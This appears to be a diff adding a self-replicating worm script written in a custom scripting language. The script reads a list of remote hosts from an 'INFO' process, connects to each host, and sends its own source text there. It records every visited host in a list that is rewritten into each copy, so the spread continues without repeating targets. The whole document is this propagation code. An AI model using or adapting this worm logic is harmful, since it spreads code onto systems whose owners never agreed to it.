@@ -1,0 +1,78 @@
+# This process checks the info process for remote systems to connect to 
+# then it connects and copies itself over.
+
+# This will be added too everytime a new copy is made.
+# It also prevents us visiting the same place twice
+alias 0 CHECK_VISITED
+var @visited
+set visited:"1" "localhost 4030"
+
+proc main
+var pid name s addr sock 
+var site port addr2
+var visitcnt cnt words word pln pln2
+
+# Find info process
+foreach pid name in $pcs
+	if name="INFO"
+		# Send a copy of ourself to every host
+		foreach s addr in pid.hosts
+			set site [elements addr 1]
+			set port [elements addr 2]
+
+			# See if we've already been there
+			if CHECK_VISITED
+				set visitcnt 1
+				foreach s addr2 in visited
+					if site=[elements addr2 1] and \
+					   port=[elements addr2 2]
+						goto "CONT"
+					fi
+					inc visitcnt
+				nexteach
+			fi
+
+			# New site , connect and send copy of ourself.
+			if [trap [set sock [connect site port]]]
+				continue
+			fi
+			out sock
+			set pln ""
+			set pln2 ""
+			set word ""
+
+			# Go through program text 
+			foreach s words in $prog
+				set cnt [count words]
+				set pln [elements words [math cnt-2]]
+
+				# Print newline
+				if pln2!="" and pln!=pln2
+					printnl
+				fi
+
+				# See if last word was start of visited array, if so
+				# add new site visited (we add to the program code).
+				if CHECK_VISITED
+					if word="@visited"
+						printnl [format "set visited:\"%d\" \"%s %s\"\n" \
+					              visitcnt site port]
+					fi
+				fi
+
+				# Print program text
+				set word [elements words 1 [math cnt-3]] 
+				print word " "
+
+				set pln2 pln
+			nexteach	
+
+			print [format "\n.\n"]
+			close sock
+
+			label "CONT"
+		nexteach
+	fi
+nexteach
+endproc
+
